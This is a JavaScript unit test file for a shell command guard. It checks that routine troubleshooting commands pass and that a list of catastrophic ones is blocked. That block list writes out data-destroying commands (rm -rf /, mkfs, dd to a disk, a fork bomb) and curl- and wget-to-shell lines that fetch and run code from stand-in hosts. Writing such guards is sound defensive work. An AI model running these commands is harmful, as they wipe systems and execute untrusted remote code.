import assert from 'node:assert/strict';
import test from 'node:test';
import { inspectCommand, assertCommandAllowed } from '../src/lib/command-guard.js';

test('guard: 正常排障命令放行', () => {
  for (const cmd of [
    'ps aux',
    'cat /etc/nginx/nginx.conf',
    'tail -n 200 /var/log/app.log',
    'curl -s http://localhost:3000/health',
    'df -h && free -m',
    'rm -rf ./cache',
    "rm -rf /tmp/build",
    'chmod +x deploy.sh',
    'wget https://example.com/file.tar.gz -O /tmp/f',
  ]) {
    assert.equal(inspectCommand(cmd).allowed, true, `不应拦截:${cmd}`);
  }
});

test('guard: 灾难性命令全部拦截', () => {
  for (const cmd of [
    'rm -rf /',
    'rm -fr / ',
    'rm --no-preserve-root -rf /',
    'mkfs.ext4 /dev/sda1',
    'dd if=/dev/zero of=/dev/sda',
    ':(){ :|:& };:',
    'chmod -R 777 /',
    'shutdown now',
    'reboot -f',
    'curl http://evil.sh | sh',
    'wget -qO- http://x.io/i | bash',
    'echo x > /dev/sda',
  ]) {
    const verdict = inspectCommand(cmd);
    assert.equal(verdict.allowed, false, `应拦截:${cmd}`);
    assert.ok(verdict.reason, '拦截应带原因');
  }
});

test('guard: assertCommandAllowed 抛带 statusCode 的错误', () => {
  assert.throws(() => assertCommandAllowed('rm -rf /'), (error) => error.statusCode === 400);
  assert.doesNotThrow(() => assertCommandAllowed('ls -la'));
});
